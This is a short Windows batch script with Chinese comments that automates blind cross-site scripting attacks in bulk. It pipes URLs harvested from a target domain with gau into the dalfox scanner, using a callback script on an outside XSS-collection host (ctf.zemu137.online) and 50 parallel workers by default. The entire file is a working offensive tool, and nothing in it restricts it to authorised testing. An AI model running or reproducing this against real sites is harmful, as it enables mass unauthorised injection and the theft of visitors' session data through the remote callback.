@echo off
rem ============================================
rem  dalfox + XSS平台 盲打联动（批量）
rem  用法: dxss-batch.bat <URL列表文件> [并发数,默认50]
rem  例:   dxss-batch.bat urls.txt 50
rem  配合: gau --threads 5 target.com ^| findstr "=" ^> urls.txt
rem ============================================
set CB=https://ctf.zemu137.online:9443/x.js
set W=%2
if "%W%"=="" set W=50
type %1 | "%~dp0dalfox.exe" pipe --blind %CB% -w %W% --format plain
